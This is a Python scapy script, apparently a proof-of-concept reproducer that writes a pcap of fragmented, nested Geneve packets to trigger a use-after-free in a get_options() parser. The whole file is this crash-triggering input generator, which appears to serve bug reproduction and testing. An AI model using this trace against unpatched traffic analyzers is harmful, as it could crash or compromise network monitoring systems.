#!/usr/bin/env python3
"""Generate a fragmented nested Geneve trace for the get_options() UAF.

Generated with OpenAI Codex by Trail of Bits.
"""

import argparse
from pathlib import Path

from scapy.all import IP, UDP, Ether, Raw, fragment, wrpcap
from scapy.contrib.geneve import GENEVE, GeneveOptions


def _build_frames() -> list[Ether]:
    final_packet = (
        IP(src="203.0.113.1", dst="203.0.113.2")
        / UDP(sport=22222, dport=9999)
        / Raw(b"Q")
    )
    nested_geneve = (
        GENEVE(
            proto=0x0800,
            vni=0x123456,
            options=[GeneveOptions(classid=0x0102, type=3, data=b"")],
        )
        / final_packet
    )
    fragmented_packet = fragment(
        IP(src="198.51.100.1", dst="198.51.100.2", id=0x4321)
        / UDP(sport=33333, dport=6081)
        / nested_geneve,
        fragsize=32,
    )

    frames = []
    for packet_index, packet_fragment in enumerate(fragmented_packet, start=1):
        frame = (
            Ether(src="02:00:00:00:00:01", dst="00:11:22:33:44:55")
            / IP(src="192.0.2.1", dst="192.0.2.2")
            / UDP(sport=40000, dport=6081)
            / GENEVE(proto=0x0800, vni=1)
            / packet_fragment
        )
        frame.time = packet_index
        frames.append(frame)

    return frames


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    default_output = Path(__file__).with_suffix("")
    parser.add_argument("output", nargs="?", type=Path, default=default_output)
    args = parser.parse_args()

    wrpcap(str(args.output), _build_frames())
    print(args.output)


if __name__ == "__main__":
    main()
